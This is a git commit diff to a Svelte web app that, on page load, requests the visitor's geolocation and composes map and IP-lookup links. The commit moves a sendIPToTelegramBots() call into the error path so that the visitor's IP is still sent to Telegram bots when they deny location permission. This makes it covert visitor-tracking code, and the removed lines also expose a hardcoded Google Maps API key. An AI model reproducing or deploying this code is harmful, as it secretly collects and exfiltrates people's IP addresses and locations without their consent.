96d07cd23066e9fb309a77b2b6613d0486db78ee
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-25 05:43:31 +0300

    Update App.svelte

--- src/App.svelte
+++ src/App.svelte
@@ -2,7 +2,6 @@
   import { onMount } from 'svelte';
 
   onMount(async () => {
- sendIPToTelegramBots();
   
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
@@ -13,8 +12,7 @@
       (error) => {
         if (error.code === error.PERMISSION_DENIED) {
           // Location permission denied, send IP result to Telegram bots
-         // sendIPToTelegramBots();
- console.error('Location permission denied.');
+          sendIPToTelegramBots();
         }
       }
     );
@@ -35,16 +33,10 @@
 
  // Create the message with the clickable link to Google Maps
  
- 
-  const googleMapsAPIKey = 'AIzaSyATABWJOS9Gc8FUoHOsXcd4kO8cUKxYXhs';
-  const mapWidth = 400;
-  const mapHeight = 300;
-  const mapZoom = 15;
-  const locationPreviewURL = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=${mapZoom}&size=${mapWidth}x${mapHeight}&key=${googleMapsAPIKey}`;
-
-
+   
     const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const clickableLink = `<img src="${locationPreviewURL}" alt="Location Preview">`;
+	const pinIconURL = 'https://developers.google.com/static/maps/images/maps-icon.svg'; // Replace with the actual path or URL of your pin icon
+    const clickableLink = `<a href="${locationLink}"><img src="${pinIconURL}" alt="Location Pin">${locationLinkText}</a>`;
 	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
 
